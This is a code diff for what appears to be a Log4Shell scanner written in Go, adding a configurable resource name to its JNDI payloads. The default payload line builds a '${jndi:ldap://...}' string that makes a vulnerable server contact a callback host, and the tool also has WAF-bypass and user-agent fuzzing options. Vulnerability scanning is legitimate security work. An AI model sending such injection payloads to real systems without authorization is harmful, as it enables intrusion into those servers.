@@ -29,6 +29,7 @@ type RemoteOptions struct {
 	CADDR              string
 	RequestType        string
 	Proxies            []*url.URL
+	Resource           string
 	NoUserAgentFuzzing bool
 	NoRedirect         bool
 	WafBypass          bool
@@ -263,8 +264,29 @@ func newHTTPClient(opts *RemoteOptions) *http.Client {
 }
 
 func createPayloads(opts *RemoteOptions) ([]string, error) {
+	resource := "l4s"
+	if opts.Resource != "" {
+		resource = opts.Resource
+	}
+
 	if len(opts.Payloads) > 0 {
-		return opts.Payloads, nil
+		customPayloads := []string{}
+
+		for _, p := range opts.Payloads {
+			t, err := template.New("custom-payload").Parse(p)
+			if err != nil {
+				return nil, err
+			}
+
+			parsed, err := executeTemplate(t, resource, opts.CADDR)
+			if err != nil {
+				return nil, err
+			}
+
+			customPayloads = append(customPayloads, string(parsed))
+		}
+
+		return customPayloads, nil
 	}
 
 	if opts.PayLoadsFile != "" {
@@ -273,7 +295,7 @@ func createPayloads(opts *RemoteOptions) ([]string, error) {
 			return nil, err
 		}
 
-		p, err := executeTemplate(t, "l4s", opts.CADDR)
+		p, err := executeTemplate(t, resource, opts.CADDR)
 		if err != nil {
 			return nil, err
 		}
@@ -281,7 +303,7 @@ func createPayloads(opts *RemoteOptions) ([]string, error) {
 		return parseFileContent(p), nil
 	}
 
-	payloads := []string{fmt.Sprintf("${jndi:ldap://%v/l4s}", opts.CADDR)}
+	payloads := []string{fmt.Sprintf("${jndi:ldap://%v/%s}", opts.CADDR, resource)}
 
 	if opts.WafBypass {
 		t, err := template.ParseFS(f, "resource/bypass.txt")
@@ -289,7 +311,7 @@ func createPayloads(opts *RemoteOptions) ([]string, error) {
 			return nil, err
 		}
 
-		p, err := executeTemplate(t, "l4s", opts.CADDR)
+		p, err := executeTemplate(t, resource, opts.CADDR)
 		if err != nil {
 			return nil, err
 		}
